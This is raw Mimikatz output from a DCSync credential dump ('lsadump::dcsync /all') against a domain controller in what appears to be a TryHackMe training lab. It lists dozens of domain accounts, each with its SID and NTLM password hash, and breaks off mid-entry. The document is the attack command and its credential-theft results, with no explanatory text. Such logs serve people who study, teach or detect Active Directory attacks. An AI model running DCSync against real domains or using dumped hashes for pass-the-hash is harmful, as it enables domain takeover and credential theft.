Using 'lorraine.gill_dcdump.txt' for logfile : OK

mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] Exporting domain 'za.tryhackme.loc'
[rpc] Service  : ldap
SAM Username         : charlotte.davies
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1962
Object Relative ID   : 1962

Credentials:
  Hash NTLM: c9ea17a84c4225b87d5013742fbe15fa

Object RDN           : nathan.wong

** SAM ACCOUNT **

SAM Username         : nathan.wong
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1963
Object Relative ID   : 1963

Credentials:
  Hash NTLM: 211dc578c920707658f4a04f5f3704fe

Object RDN           : norman.bennett

** SAM ACCOUNT **

SAM Username         : norman.bennett
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1964
Object Relative ID   : 1964

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

Object RDN           : douglas.mistry

** SAM ACCOUNT **

SAM Username         : douglas.mistry
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1965
Object Relative ID   : 1965

Credentials:
  Hash NTLM: 894a104d84edd06d9cd7bd8b72946c29

Object RDN           : amber.naylor

** SAM ACCOUNT **

SAM Username         : amber.naylor
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1966
Object Relative ID   : 1966

Credentials:
  Hash NTLM: 8091fee1f3890584904bd7d5cea1240e

Object RDN           : eileen.singh

** SAM ACCOUNT **

SAM Username         : eileen.singh
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1967
Object Relative ID   : 1967

Credentials:
  Hash NTLM: 7361fedbed9b8cb43d770ef53a584a62

Object RDN           : joanna.booth

** SAM ACCOUNT **

SAM Username         : joanna.booth
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1968
Object Relative ID   : 1968

Credentials:
  Hash NTLM: 017fcd58191b46c38ae793d2c05b19d8

Object RDN           : justin.williams

** SAM ACCOUNT **

SAM Username         : justin.williams
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1969
Object Relative ID   : 1969

Credentials:
  Hash NTLM: e1e0dd20ca12ff5f81f32cb89426cf42

Object RDN           : anna.jones

** SAM ACCOUNT **

SAM Username         : anna.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1970
Object Relative ID   : 1970

Credentials:
  Hash NTLM: 3ffe3deb3cb703c4587e4c92c49f3a20

Object RDN           : charlene.patel

** SAM ACCOUNT **

SAM Username         : charlene.patel
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1971
Object Relative ID   : 1971

Credentials:
  Hash NTLM: 316c5ae8a7b5dfce4a5604d17d9e976e

Object RDN           : philip.hewitt

** SAM ACCOUNT **

SAM Username         : philip.hewitt
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1972
Object Relative ID   : 1972

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : marilyn.powell

** SAM ACCOUNT **

SAM Username         : marilyn.powell
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1973
Object Relative ID   : 1973

Credentials:
  Hash NTLM: 9839e5c4e8d0e9327d7f885b28a98a67

Object RDN           : callum.lyons

** SAM ACCOUNT **

SAM Username         : callum.lyons
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1974
Object Relative ID   : 1974

Credentials:
  Hash NTLM: fe2c922bf320860dad3271921a166ef5

Object RDN           : lisa.spencer

** SAM ACCOUNT **

SAM Username         : lisa.spencer
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1975
Object Relative ID   : 1975

Credentials:
  Hash NTLM: 316c5ae8a7b5dfce4a5604d17d9e976e

Object RDN           : lydia.williams

** SAM ACCOUNT **

SAM Username         : lydia.williams
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1976
Object Relative ID   : 1976

Credentials:
  Hash NTLM: 64dc2cd28169a35d2e50650428263708

Object RDN           : ruth.davison

** SAM ACCOUNT **

SAM Username         : ruth.davison
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1977
Object Relative ID   : 1977

Credentials:
  Hash NTLM: 87197cf7f2c2f9a99df7f95494d09deb

Object RDN           : gary.wilkinson

** SAM ACCOUNT **

SAM Username         : gary.wilkinson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1978
Object Relative ID   : 1978

Credentials:
  Hash NTLM: 6be1b44c307e1285b164c96fe25a341c

Object RDN           : mandy.heath

** SAM ACCOUNT **

SAM Username         : mandy.heath
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1979
Object Relative ID   : 1979

Credentials:
  Hash NTLM: 9015cbe9582416bac6a9f9538867c66a

Object RDN           : roger.leach

** SAM ACCOUNT **

SAM Username         : roger.leach
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1980
Object Relative ID   : 1980

Credentials:
  Hash NTLM: fab086de5d7400288dcb035e434aa4ed

Object RDN           : rachel.young

** SAM ACCOUNT **

SAM Username         : rachel.young
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1981
Object Relative ID   : 1981

Credentials:
  Hash NTLM: c84ac938d99e6c6c47f334144176ca93

Object RDN           : max.robinson

** SAM ACCOUNT **

SAM Username         : max.robinson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1982
Object Relative ID   : 1982

Credentials:
  Hash NTLM: 97fe00b363ebb7ce1c57ed4428951a2b

Object RDN           : daniel.williams

** SAM ACCOUNT **

SAM Username         : daniel.williams
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1983
Object Relative ID   : 1983

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : frederick.ahmed

** SAM ACCOUNT **

SAM Username         : frederick.ahmed
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1984
Object Relative ID   : 1984

Credentials:
  Hash NTLM: 7cc254715b4c6e2401ca224d6870cc2e

Object RDN           : frederick.singh

** SAM ACCOUNT **

SAM Username         : frederick.singh
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1985
Object Relative ID   : 1985

Credentials:
  Hash NTLM: 1380d810bf0366d78cf59e5d8269070d

Object RDN           : claire.elliott

** SAM ACCOUNT **

SAM Username         : claire.elliott
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1986
Object Relative ID   : 1986

Credentials:
  Hash NTLM: d9adbf6e3f331694858282b13d0f784f

Object RDN           : linda.burns

** SAM ACCOUNT **

SAM Username         : linda.burns
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1987
Object Relative ID   : 1987

Credentials:
  Hash NTLM: 58a478135a93ac3bf058a5ea0e8fdb71

Object RDN           : patrick.davidson

** SAM ACCOUNT **

SAM Username         : patrick.davidson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1988
Object Relative ID   : 1988

Credentials:
  Hash NTLM: b6ae92ca07c7e1be7d93a2965aa570e0

Object RDN           : kieran.williams

** SAM ACCOUNT **

SAM Username         : kieran.williams
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1989
Object Relative ID   : 1989

Credentials:
  Hash NTLM: 55e26d1179d29220d3194a203b439453

Object RDN           : bethany.miller

** SAM ACCOUNT **

SAM Username         : bethany.miller
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1990
Object Relative ID   : 1990

Credentials:
  Hash NTLM: a320e2a68ea2867d53019cda769ba1f4

Object RDN           : carol.swift

** SAM ACCOUNT **

SAM Username         : carol.swift
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1991
Object Relative ID   : 1991

Credentials:
  Hash NTLM: 43ff3b809dd2bfb19071c04acacd98bd

Object RDN           : pauline.henderson

** SAM ACCOUNT **

SAM Username         : pauline.henderson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1992
Object Relative ID   : 1992

Credentials:
  Hash NTLM: 5447682a0892aca02634c0995d0b35b0

Object RDN           : brian.campbell

** SAM ACCOUNT **

SAM Username         : brian.campbell
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1993
Object Relative ID   : 1993

Credentials:
  Hash NTLM: 316c5ae8a7b5dfce4a5604d17d9e976e

Object RDN           : sam.day

** SAM ACCOUNT **

SAM Username         : sam.day
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1994
Object Relative ID   : 1994

Credentials:
  Hash NTLM: 97060ae01ffd60f9a9745340d70b311e

Object RDN           : thomas.johnson

** SAM ACCOUNT **

SAM Username         : thomas.johnson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1995
Object Relative ID   : 1995

Credentials:
  Hash NTLM: 8091fee1f3890584904bd7d5cea1240e

Object RDN           : paula.jones

** SAM ACCOUNT **

SAM Username         : paula.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1996
Object Relative ID   : 1996

Credentials:
  Hash NTLM: 316c5ae8a7b5dfce4a5604d17d9e976e

Object RDN           : victor.horton

** SAM ACCOUNT **

SAM Username         : victor.horton
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1997
Object Relative ID   : 1997

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : tina.murray

** SAM ACCOUNT **

SAM Username         : tina.murray
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1998
Object Relative ID   : 1998

Credentials:
  Hash NTLM: 8091fee1f3890584904bd7d5cea1240e

Object RDN           : carl.davies

** SAM ACCOUNT **

SAM Username         : carl.davies
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1999
Object Relative ID   : 1999

Credentials:
  Hash NTLM: b674eca18098e494adcd8ee1290d3af1

Object RDN           : lewis.wright

** SAM ACCOUNT **

SAM Username         : lewis.wright
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2000
Object Relative ID   : 2000

Credentials:
  Hash NTLM: 095ed7db93dfa72c26d49a9b0487c3ee

Object RDN           : naomi.stokes

** SAM ACCOUNT **

SAM Username         : naomi.stokes
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2001
Object Relative ID   : 2001

Credentials:
  Hash NTLM: 9cf09d4b54b18dfded57ebb95d1866b9

Object RDN           : hayley.clayton

** SAM ACCOUNT **

SAM Username         : hayley.clayton
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2002
Object Relative ID   : 2002

Credentials:
  Hash NTLM: 3ea2e1418f528cae22b44dc22ea12ef9

Object RDN           : christian.lloyd

** SAM ACCOUNT **

SAM Username         : christian.lloyd
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2003
Object Relative ID   : 2003

Credentials:
  Hash NTLM: 8091fee1f3890584904bd7d5cea1240e

Object RDN           : joyce.price

** SAM ACCOUNT **

SAM Username         : joyce.price
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2004
Object Relative ID   : 2004

Credentials:
  Hash NTLM: f2ee779964ca8adc632da5a3c7972d52

Object RDN           : katherine.jones

** SAM ACCOUNT **

SAM Username         : katherine.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2005
Object Relative ID   : 2005

Credentials:
  Hash NTLM: 78b59b22ebcc1fcb3941cdf3b696766e

Object RDN           : joanna.carpenter

** SAM ACCOUNT **

SAM Username         : joanna.carpenter
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2006
Object Relative ID   : 2006

Credentials:
  Hash NTLM: 6c995c0f8b40b89ac2b00c85702b4f21

Object RDN           : maureen.wilson

** SAM ACCOUNT **

SAM Username         : maureen.wilson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2007
Object Relative ID   : 2007

Credentials:
  Hash NTLM: 3583c344541d79754119ce1b9fc2372d

Object RDN           : eileen.johnson

** SAM ACCOUNT **

SAM Username         : eileen.johnson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2008
Object Relative ID   : 2008

Credentials:
  Hash NTLM: 938286dad63d06b946f1054933ae5172

Object RDN           : malcolm.black

** SAM ACCOUNT **

SAM Username         : malcolm.black
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2009
Object Relative ID   : 2009

Credentials:
  Hash NTLM: b9141416019afb98cf4a61d1b4e80ad4

Object RDN           : andrea.scott

** SAM ACCOUNT **

SAM Username         : andrea.scott
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2010
Object Relative ID   : 2010

Credentials:
  Hash NTLM: b07c72bad8e48f298fa57fd722c4b24a

Object RDN           : hazel.cooke

** SAM ACCOUNT **

SAM Username         : hazel.cooke
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2011
Object Relative ID   : 2011

Credentials:
  Hash NTLM: 9b84b8e76da8c8bfe69a6fa8e7d1240e

Object RDN           : allan.archer

** SAM ACCOUNT **

SAM Username         : allan.archer
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2012
Object Relative ID   : 2012

Credentials:
  Hash NTLM: 80d7e9ba16d93004f2c3b67b1c06873e

Object RDN           : rita.smith

** SAM ACCOUNT **

SAM Username         : rita.smith
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2013
Object Relative ID   : 2013

Credentials:
  Hash NTLM: 309636b236ac15bfe6b3eb34743d5601

Object RDN           : charlie.green

** SAM ACCOUNT **

SAM Username         : charlie.green
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2014
Object Relative ID   : 2014

Credentials:
  Hash NTLM: dcd1e97ba9fae464adabb5d68aeabc31

Object RDN           : leigh.brown

** SAM ACCOUNT **

SAM Username         : leigh.brown
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2015
Object Relative ID   : 2015

Credentials:
  Hash NTLM: 5defe54e7b38a429c0d846be7d2158b7

Object RDN           : mohammed.gallagher

** SAM ACCOUNT **

SAM Username         : mohammed.gallagher
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2016
Object Relative ID   : 2016

Credentials:
  Hash NTLM: 940f7203b6ddadbb475f5c15b45af540

Object RDN           : bryan.fitzgerald

** SAM ACCOUNT **

SAM Username         : bryan.fitzgerald
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2017
Object Relative ID   : 2017

Credentials:
  Hash NTLM: 8023b471d862803ba5b3f1455b87d2b5

Object RDN           : aaron.duffy

** SAM ACCOUNT **

SAM Username         : aaron.duffy
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2018
Object Relative ID   : 2018

Credentials:
  Hash NTLM: 09677e7c74de173276db137d9e56c657

Object RDN           : conor.smith

** SAM ACCOUNT **

SAM Username         : conor.smith
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2019
Object Relative ID   : 2019

Credentials:
  Hash NTLM: 3051c23614058ab55a3c2d94c5319290

Object RDN           : alex.richardson

** SAM ACCOUNT **

SAM Username         : alex.richardson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2020
Object Relative ID   : 2020

Credentials:
  Hash NTLM: 441b3c91ce9566c76f30db6a1a5d27b7

Object RDN           : pamela.shaw1

** SAM ACCOUNT **

SAM Username         : pamela.shaw1
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-2021
Object Relative ID   : 2021

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

Object RDN           : elizabeth.bates

** SAM ACCOUNT **

SAM Username         : elizabeth.bates
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
